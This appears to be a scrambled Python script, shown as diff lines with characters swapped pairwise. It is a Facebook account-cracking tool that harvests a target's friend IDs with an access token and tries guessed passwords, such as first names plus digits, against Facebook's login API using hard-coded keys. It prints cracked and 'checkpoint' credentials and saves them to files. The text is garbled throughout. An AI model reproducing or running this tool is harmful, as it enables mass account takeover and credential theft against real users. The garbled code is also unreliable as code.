+		r	wai_pntu"(n\0\331[9;m7\[30[3;139Bmca\k30[3;179]m)"
+		s	pure)(
+		rpni"t0\331[9;m4eGttni gDI\s30[3;179AmCCSE SRGNA Doldani.g.."	
+r	= r qeeuts.seg(th"ttsp/:g/arhpf.cabeoo.koc/m+"di+t/"rfeidn?scaecsst_kone"=t+kote)	
+z	= j os.nolda(s.rettx)	
+f	roi i  n[zd'ta'a:]
+		i	.dpaepdni('[di]')	
+lefip ae k==0":"
+		emun)(
+e	sl:e
+		rpni t\"1x[b;179Fmli lnic roertcyl"	
+p	lihis_pure)(
+		
+rpni t\"30[3;179TmtolaI sD0\331[9;m7 :0\331[9;m4+"ts(rel(ndi))
+j	lana'(0\331[9;m4lPaeesW ia\t30[3;149вmўЂЂввўўЂЂввўўЂ)'
+t	tiki= [ .'  ' ',..  ,'.'..' ]	
+of r onit tiki:	
+p	irtn"(r\0\331[9;m4lCnoni gsII  nrPgoerss0\331[9;m7+")o;,ys.stsodtuf.ulhs)(t;mi.elsee(p)1
+p	irtn" ""
+0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љвљ\
+30[3;123вmљљ•ввђЊ••ввЊЊ•C EHKCOPNI TCAOCNU TPONEA TFRE7 D YAвSЊ••ввЊЊ••ввђљљ
+"""	
+
+		
+ajal(n\'30[3;179>m\>30[3;139CmolingnS attr..0\331[9;m7<<' ) 
+    
+		
+
+				
+ed famnia(gr:)
+		lgbolao sk
+		sure= a gr
+		rt:y
+		o	.skmid(ro'tu)'
+		xeectpO ESrrro:	
+		apss 	
+t	yr	:												
+		a	= r qeeuts.seg(th'ttsp/:g/arhpf.cabeoo.koc/m+'sure'+?/caecsst_kone'=t+kote	)												
+		 b =sjnol.aosda(t.xe)t												
+		p	sa1s= b '[ifsr_tanem]'+ ' 87'6												
+		d	ta a =rullbiu.lrpone"(thpt:s//-bpa.iafecobkoc.mom/teoh/duahtl.gonia?ccse_sotek=n32779509591956%55252C7f041a0badebf56ca727a93dea122361bf&roam=tsjnos&kdv_reisno2=e&amli"=(+sure+)&"olacele=_nSUp&sawsro=d+"p(sa1s+)&"ds=koi&segenarets_seisnoc_ooikse1=s&gi3=5f559ff96bf1dca70a4cf4855f22fe"6	)												
+		 q =sjnol.ao(dadat	)												
+		fi' caecsst_kone 'niq :	
+		x	= r qeeuts.seg(th"ttsp/:g/arhpf.cabeoo.koc/m+"sure"+a?ccse_sotek=n+"[qa'ccse_sotek'n)]
+				 z =sjnol.aosdx(t.xe)t
+				rpni t\'1x[b;119[m  њв “] \ 1x[b;129Hmca1k00р%’џ'Ђ												
+		p	irtn' x\b11[9;m1в[єџ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'												
+		p	irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1DI\ 1x[b;119 m    : \ 1x[b;119'm+ u es	r										
+				rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Pmsawsro dx\b11[9;m1 :x\b11[9;m1 ' +apss 1 +\''n												
+		o	ska.ppne(dsurep+sa1s) 
+                      e sl:e
+		 	      i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	  p irtn' x\b11[9;m3 [њв – ]x\b11[9;m3hCcepkiotn'	
+		 	  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b [ n'ma'e]	
+		 	  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aPssowdr\ 1x[b;139:m\ 1x[b;139'm+ p sa1s+ ' n\'	
+		 	  c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				    ec.krwti(eI":D "u+es+r" P :w "p+sa1s"+n\)"
+				    ec.klcso(e)	
+		 	  c keopni.tpaepdnu(es+rapss)1
+                                lees:	
+		 	  p sa2s= b '[ifsr_tanem]'+ ' 21'3										
+                                    adat= u lril.bruolep(nh"ttsp/:b/a-ipf.cabeoo.koc/memhtdoa/tu.holig?ncaecsst_kone2=735799909561552%25750C1f04aaebfd6ba52ca737e91d2a62b3&1ofmrtaj=os&nds_kevsroi=n&2meia=l+"u(es)r"+l&cola=eneU_&Sapssowdr"=(+apss)2"+s&kdi=sog&nereta_eesssoi_nockoei=s&1is=gf355f599bf16cf7daac0445ff825e26f)"												
+		 	          q = j os.noldad(ta)a												
+		 	          i  fa'ccse_sotek'ni  n:q		
+		 	          x = r qeeuts.seg(th"ttsp/:g/arhpf.cabeoo.koc/m+"sure"+a?ccse_sotek=n+"[qa'ccse_sotek'n)]
+				             z =sjnol.aosdx(t.xe)t
+				            rpni t\'1x[b;119[m  њв “] \ 1x[b;129Hmca1k00р%’џ'Ђ												
+		 	          p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'												
+		 	          p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1DI\ 1x[b;119 m    : \ 1x[b;119'm+ u es	r								
+		 	          p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aPssowdr\ 1x[b;119:m\ 1x[b;119'm+ p sa2s+ ' n\	'										
+				            ko.spaepdnu(es+rapss)2
+                                    lees:	
+		                  i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	              rpni t\'1x[b;139[mв –њ] \ 1x[b;139Cmehkcopni't
+				              p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b '[anem]'
+				              p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	              rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Pmsawsro dx\b11[9;m3 :x\b11[9;m3 ' +apss 2 +\''n
+				              c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				              c kew.iret"(DI":+ sure + "wP":+ apss+2\""n)	
+		 	              ec.klcso(e)	
+		 	              ecpkiotna.ppne(dsurep+sa2s	)								
+		 	          lees	:										
+				 	      apss 3 =[bf'ritsn_ma'e+]1'3254'6										
+				 	      adat= u lril.bruolep(nh"ttsp/:b/a-ipf.cabeoo.koc/memhtdoa/tu.holig?ncaecsst_kone2=735799909561552%25750C1f04aaebfd6ba52ca737e91d2a62b3&1ofmrtaj=os&nds_kevsroi=n&2meia=l+"u(es)r"+l&cola=eneU_&Sapssowdr"=(+apss)3"+s&kdi=sog&nereta_eesssoi_nockoei=s&1is=gf355f599bf16cf7daac0445ff825e26f)"										
+				 	       q =sjnol.ao(dadat	)										
+				      i  fa'ccse_sotek'ni  n:q		
+				 	       x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                       z =sjnol.aosdx(t.xe)t
+						      p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'								
+				 	      rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Nmma ex\b11[9;m1     :x\b11[9;m1 ' +[bn'ma'e	]								
+						      p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1DI\ 1x[b;119 m    : \ 1x[b;119'm+ u es	r						
+						      p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aPssowdr\ 1x[b;119:m\ 1x[b;119'm+ p sa3s+ ' n\	'								
+						      o ska.ppne(dsurep+sa3s) 
+                                              lees:	
+		                              i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	                          rpni t\'1x[b;139[mв –њ] \ 1x[b;139Cmehkcopni't
+				                          p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b '[anem]'
+				                          p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	                          rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Pmsawsro dx\b11[9;m3 :x\b11[9;m3 ' +apss 3 +\''n
+				                          c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				                          c kew.iret"(DI":+ sure + "wP":+ apss+3\""n)	
+		 	                          ec.klcso(e)	
+		 	                          ecpkiotna.ppne(dsurep+sa3s	)								
+				 	              lees	:										
+				 	          apss 4 =[bf'ritsn_ma'e ] +1'32547698'0												
+		                                  d ta a =rullbiu.lrpone"(thpt:s//-bpa.iafecobkoc.mom/teoh/duahtl.gonia?ccse_sotek=n32779509591956%55252C7f041a0badebf56ca727a93dea122361bf&roam=tsjnos&kdv_reisno2=e&amli"=(+sure+)&"olacele=_nSUp&sawsro=d+"p(sa4s+)&"ds=koi&segenarets_seisnoc_ooikse1=s&gi3=5f559ff96bf1dca70a4cf4855f22fe"6	)												
+		                                  q = j os.noldad(ta)a												
+		 	                                  fi' caecsst_kone 'niq 	:		
+				 	                   x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                                   z =sjnol.aosdx(t.xe)t
+				                                  p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'										
+				                                  p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'												
+		 	                                  rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Im Dx\b11[9;m1       :x\b11[9;m1 ' +sure												
+		 	                                  rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Pmsawsro dx\b11[9;m1 :x\b11[9;m1 ' +apss 4 +\''n												
+		 	                                  ko.spaepdnu(es+rapss)4
+                                                          e sl:e
+		 	                                          fi' ww.wafecobkoc.mo 'niq "[reor_rsm"g:]
+				                                      p irtn' x\b11[9;m3 [њв – ]x\b11[9;m3hCcepkiotn'	
+		 	                                      rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Nmma ex\b11[9;m3     :x\b11[9;m3 ' +[bn'ma'e]	
+		 	                                      rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Im Dx\b11[9;m3       :x\b11[9;m3 ' +sure
+				                                      p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aPssowdr\ 1x[b;139:m\ 1x[b;139'm+ p sa4s+ ' n\'	
+		 	                                      ec k =pone"(uo/tusep_rpct.tx,"" "a)	
+		 	                                      ec.krwti(eI":D "u+es+r" P :w "p+sa4s"+n\)"
+				                                      c kec.oles)(
+				                                      c keopni.tpaepdnu(es+rapss)4						
+				                          e sl:e										
+				 	                      apss 5 =P'kasiat'n								
+				 	                      adat= u lril.bruolep(nh"ttsp/:b/a-ipf.cabeoo.koc/memhtdoa/tu.holig?ncaecsst_kone2=735799909561552%25750C1f04aaebfd6ba52ca737e91d2a62b3&1ofmrtaj=os&nds_kevsroi=n&2meia=l+"u(es)r"+l&cola=eneU_&Sapssowdr"=(+apss)5"+s&kdi=sog&nereta_eesssoi_nockoei=s&1is=gf355f599bf16cf7daac0445ff825e26f)"								
+						                      q = j os.noldad(ta)a								
+						                      i  fa'ccse_sotek'ni  n:q		
+				 	                               x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                                               z =sjnol.aosdx(t.xe)t
+						                              p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'						
+				 	                              rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Nmma ex\b11[9;m1     :x\b11[9;m1 ' +[bn'ma'e	]						
+						                              p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1DI\ 1x[b;119 m    : \ 1x[b;119'm+ u es	r				
+						                              p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aPssowdr\ 1x[b;119:m\ 1x[b;119'm+ p sa5s+ ' n\	'						
+						                              o ska.ppne(dsurep+sa5s	)
+                                                                      e sl:e
+		 	                                                      fi' ww.wafecobkoc.mo 'niq "[reor_rsm"g:]
+				                                                  p irtn' x\b11[9;m3 [њв – ]x\b11[9;m3hCcepkiotn'	
+		 	                                                  rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Nmma ex\b11[9;m3     :x\b11[9;m3 ' +[bn'ma'e]	
+		 	                                                  rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Im Dx\b11[9;m3       :x\b11[9;m3 ' +sure
+				                                                  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aPssowdr\ 1x[b;139:m\ 1x[b;139'm+ p sa5s+ ' n\'	
+		 	                                                  ec k =pone"(uo/tusep_rpct.tx,"" "a)	
+		 	                                                  ec.krwti(eI":D "u+es+r" P :w "p+sa5s"+n\)"
+				                                                  c kec.oles)(
+				                                                  c keopni.tpaepdnu(es+rapss)5						
+				 	                              lees	:								
+						                          p sa6s= ' 877668	'										
+		 	                                                          adat= u lril.bruolep(nh"ttsp/:b/a-ipf.cabeoo.koc/memhtdoa/tu.holig?ncaecsst_kone2=735799909561552%25750C1f04aaebfd6ba52ca737e91d2a62b3&1ofmrtaj=os&nds_kevsroi=n&2meia=l+"u(es)r"+l&cola=eneU_&Sapssowdr"=(+apss)6"+s&kdi=sog&nereta_eesssoi_nockoei=s&1is=gf355f599bf16cf7daac0445ff825e26f)"												
+		 	                                                           q =sjnol.ao(dadat	)												
+		                                                          i  fa'ccse_sotek'ni  n:q		
+						 	                           x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                                                           z =sjnol.aosdx(t.xe)t
+				                                                          p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'										
+				                                                          p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'												
+		 	                                                          rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Im Dx\b11[9;m1       :x\b11[9;m1 ' +sure										
+		 	                                                          rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Pmsawsro dx\b11[9;m1 :x\b11[9;m1 ' +apss 6 +\''n												
+		 	                                                          ko.spaepdnu(es+rapss)6
+                                                                                  e sl:e
+		 	                                                                  fi' ww.wafecobkoc.mo 'niq "[reor_rsm"g:]
+				                                                              p irtn' x\b11[9;m3 [њв – ]x\b11[9;m3hCcepkiotn'	
+		 	                                                              rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Nmma ex\b11[9;m3     :x\b11[9;m3 ' +[bn'ma'e]	
+		 	                                                              rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Im Dx\b11[9;m3       :x\b11[9;m3 ' +sure
+				                                                              p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aPssowdr\ 1x[b;139:m\ 1x[b;139'm+ p sa6s+ ' n\'	
+		 	                                                              ec k =pone"(uo/tusep_rpct.tx,"" "a)	
+		 	                                                              ec.krwti(eI":D "u+es+r" P :w "p+sa6s"+n\)"
+				                                                              c kec.oles)(
+				                                                              c keopni.tpaepdnu(es+rapss)6		
+				 	                                          lees	:						
+								                              p sa7s= b '[ifsr_tanem]''+007068	'						
+						 	                              adat= u lril.bruolep(nh"ttsp/:b/a-ipf.cabeoo.koc/memhtdoa/tu.holig?ncaecsst_kone2=735799909561552%25750C1f04aaebfd6ba52ca737e91d2a62b3&1ofmrtaj=os&nds_kevsroi=n&2meia=l+"u(es)r"+l&cola=eneU_&Sapssowdr"=(+apss)7"+s&kdi=sog&nereta_eesssoi_nockoei=s&1is=gf355f599bf16cf7daac0445ff825e26f)"						
+								                              q = j os.noldad(ta)a						
+								                              i  fa'ccse_sotek'ni  n:q		
+				                                                                      x = r qeeuts.seg(th"ttsp/:g/arhpf.cabeoo.koc/m+"sure"+a?ccse_sotek=n+"[qa'ccse_sotek'n)]
+				                                                                      z = j os.nolda(s.xettx)	
+								                              p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'				
+								 	                              rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Nmma ex\b11[9;m1     :x\b11[9;m1 ' +[bn'ma'e	]				
+								 	                              rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Im Dx\b11[9;m1       :x\b11[9;m1 ' +sure				
+								 	                              rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Pmsawsro dx\b11[9;m1 :x\b11[9;m1 ' +apss 7 +\''n						
+								                              o ska.ppne(dsurep+sa7s) 
+                                                                                              lees:	
+		                                                                              i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	                                                                          rpni t\'1x[b;139[mв –њ] \ 1x[b;139Cmehkcopni't
+				                                                                          p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b '[anem]'
+				                                                                          p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	                                                                          rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Pmsawsro dx\b11[9;m3 :x\b11[9;m3 ' +apss 7 +\''n
+				                                                    яю                      c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				                                                                          c kew.iret"(DI":+ sure + "wP":+ apss+7\""n)	
+		 	                                                                          ec.klcso(e)	
+		 	                                                                          ecpkiotna.ppne(dsurep+sa7s )          						
+						 	                                      lees	:						
+								 	                          apss 8 =[bf'ritsn_ma'e ] +1'2132'3												
+		                                                                                  d ta a =rullbiu.lrpone"(thpt:s//-bpa.iafecobkoc.mom/teoh/duahtl.gonia?ccse_sotek=n32779509591956%55252C7f041a0badebf56ca727a93dea122361bf&roam=tsjnos&kdv_reisno2=e&amli"=(+sure+)&"olacele=_nSUp&sawsro=d+"p(sa8s+)&"ds=koi&segenarets_seisnoc_ooikse1=s&gi3=5f559ff96bf1dca70a4cf4855f22fe"6	)												
+		                                                                                  q = j os.noldad(ta)a												
+		 	                                                                                  fi' caecsst_kone 'niq 	:		
+								 	                                   x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                                                                                   z =sjnol.aosdx(t.xe)t
+				                                                                                  p irtn' x\b11[9;m1 [в “њ   ]x\b11[9;m2aHkc01%0џрЂ’	'										
+				                                                                                  p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'												
+		 	                                                                                  rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Im Dx\b11[9;m1       :x\b11[9;m1 ' +sure										
+				                                                                                  p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aPssowdr\ 1x[b;119:m\ 1x[b;119'm+ p sa8s+ ' n\	'										
+				                                                                                  o ska.ppne(dsurep+sa8s) 
+                                                                                                          lees:	
+		                                                                                          i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	                                                                                      rpni t\'1x[b;139[mв –њ] \ 1x[b;139Cmehkcopni't
+				                                                                                      p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b '[anem]'
+				                                                                                      p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	                                                                                      rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Pmsawsro dx\b11[9;m3 :x\b11[9;m3 ' +apss 8 +\''n
+				                                                                                      c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				                                                                                      c kew.iret"(DI":+ sure + "wP":+ apss+8\""n)	
+		 	                                                                                      ec.klcso(e)	
+		 	                                                                                      ecpkiotna.ppne(dsurep+sa8s )  		
+								 	                                  lees	:				
+										                                      p sa9s= b '[ifsr_tanem]'+ ' 211332	'				
+										                                      d ta a =rullbiu.lrpone"(thpt:s//-bpa.iafecobkoc.mom/teoh/duahtl.gonia?ccse_sotek=n32779509591956%55252C7f041a0badebf56ca727a93dea122361bf&roam=tsjnos&kdv_reisno2=e&amli"=(+sure+)&"olacele=_nSUp&sawsro=d+"p(sa9s+)&"ds=koi&segenarets_seisnoc_ooikse1=s&gi3=5f559ff96bf1dca70a4cf4855f22fe"6	)				
+								 	                                       q =sjnol.ao(dadat	)				
+								 	                                      fi' caecsst_kone 'niq 	:		
+ 	                                                                                                               x =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/u+es+r?"caecsst_kone"=q+'[caecsst_kone]')	
+		 	                                                                                               z =sjnol.aosdx(t.xe)t
+										 	                                      rpni t\'1x[b;119[m  њв “] \ 1x[b;129Hmca1k00р%’џ'Ђ				
+										                                      p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1aNem\ 1x[b;119 m  : \ 1x[b;119'm+ b '[anem]'				
+										                                      p irtn' x\b11[9;m1в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m1DI\ 1x[b;119 m    : \ 1x[b;119'm+ u es	r
+										 	                                      rpni t\'1x[b;119[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;119Pmsawsro dx\b11[9;m1 :x\b11[9;m1 ' +apss 9 +\''n				
+										                                      o ska.ppne(dsurep+sa9s) 
+                                                                                                                      lees:	
+		                                                                                                      i  fw'wwf.cabeoo.koc'mi  n[qe"rrrom_gs]":	
+		 	                                                                                                  rpni t\'1x[b;139[mв –њ] \ 1x[b;139Cmehkcopni't
+				                                                                                                  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3aNem\ 1x[b;139 m  : \ 1x[b;139'm+ b '[anem]'
+				                                                                                                  p irtn' x\b11[9;m3в[ўЂЉвв±їњЉвв°ўЂ ]x\b11[9;m3DI\ 1x[b;139 m    : \ 1x[b;139'm+ u esr	
+		 	                                                                                                  rpni t\'1x[b;139[mЂввў±Љњввї°ЉЂв]ў\ 1x[b;139Pmsawsro dx\b11[9;m3 :x\b11[9;m3 ' +apss 9 +\''n
+				                                                                                                  c ke= o ep(no"tus/purec_.pxt"t ,a")"
+				                                                                                                  c kew.iret"(DI":+ sure + "wP":+ apss+9\""n)	
+		 	                                                                                                  ec.klcso(e)	
+		 	                                                                                                  ecpkiotna.ppne(dsurep+sa9s	)
+																		
+														
+		xeectp:	
+		apss
+		
+p	= T rhaePdoo(l05)	
+.pam(pamni ,di)	
+rpni t\"30[3;033вmљљ•ввђЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ"	
+rpni t "\ 30[3;139вmљљ•ввђЊ••ввЊЊ•D velepodeB  yEBH-PAYP•ввЊЊ••ввЊђ•љв"љ# eD:vEBH-PAYP
+p	irtn' 0\331[9;m6њвP…orecssH saB ee noCpmelet drPseвsЎћC rt+l.Z†в ©eNtxT py ep(tyoh2nT irkcrep.)y†в\©30[3;179.m..'.
+p	irtn\"30[3;129TmtolaO /Kx\b11[9;m3PC\ 30[3;139:m\ 30[3;179"ms+rtl(neo(sk))"+0\331[9;m7\/30[3;139"ms+rtl(nec(keopni)t)	
+rpni t"""\
+30[3;049Tmahknf rom  yotlou isgn C
+ehkcopni tDIO ep nfAet r 7aDsy
+" ""
+		
+ar_wniup(t\"\n30[3;139[m0\331[9;m6aBkc0\331[9;m3"])	
+emun)(
+ i
+ f__anem__=  =_'m_ia_n'_:	
+olig(n) 
